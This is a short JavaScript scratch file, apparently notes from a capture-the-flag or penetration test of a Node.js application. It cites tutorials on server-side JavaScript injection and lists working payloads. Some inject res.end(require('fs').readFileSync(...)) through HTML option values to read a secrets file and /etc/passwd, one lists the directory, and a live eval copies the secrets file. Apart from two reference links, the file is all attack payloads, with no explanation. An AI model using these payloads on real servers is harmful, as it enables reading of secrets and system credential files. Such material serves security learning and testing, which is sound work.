//const fs = require('fs');
// http://www.websecgeeks.com/2017/04/pentesting-nodejs-application-nodejs.html
// https://ckarande.gitbooks.io/owasp-nodegoat-tutorial/content/tutorial/a1_-_server_side_js_injection.html

// .gitignore,__init__.py,config,models,node_modules,package-lock.json,
// package.json,potplant.db,public,routes,secrets,server.js,utils,views

// res.end(require('fs').readFile('secrets'))
// res.send(require('fs').readFile('secrets'))
// &nbsp; <option value="res.end(require('fs').readFileSync('secrets/secretmessage_d740.txt').toString())">Pler</option>
//  &nbsp; <option value="res.end(require('fs').readFileSync('/etc/passwd').toString())">Pler</option>
// &nbsp; <option value="res.end(require('fs').readdirSync('.').toString())">Find</option>
//var field = "fs.readdirSync('.')";
//var field = "require('fs').readFileSync('secrets').toString()";
var field = "require('fs').createReadStream('secrets').pipe(require('fs').createWriteStream('secrets.txt'))";
var x = eval(field);
console.log(x)

